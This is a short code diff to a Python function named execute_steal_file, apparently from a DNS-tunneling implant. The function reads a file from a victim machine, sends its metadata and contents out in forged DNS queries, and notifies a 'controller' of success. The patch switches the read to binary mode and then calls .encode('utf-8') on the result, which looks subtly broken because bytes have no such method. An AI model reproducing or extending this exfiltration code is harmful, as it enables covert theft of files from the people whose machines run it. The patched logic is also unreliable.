@@ -346,7 +346,7 @@ def execute_steal_file(filepath) -> bool:
     # Our file exists, and isn't a directory, so do the transfer
     file_data = ""
     file_size_bytes = 0
-    with open(filepath, "r") as f:
+    with open(filepath, "rb") as f:
         file_data = f.read()
         file_size_bytes = len(file_data)
     filename = os.path.basename(filepath)
@@ -355,7 +355,7 @@ def execute_steal_file(filepath) -> bool:
     # Send meta data first.
     forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
     # Send the file.
-    forge_dns_query_block(file_data, FILE_TRANSFER_IDENTIFICATION)
+    forge_dns_query_block(file_data.encode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
     # Notify the controller
     query = forge_dns_query_stream("SUCCESS: Sending file...", GENERAL_MSG_IDENTIFICATION)
     send_dns_query(query)
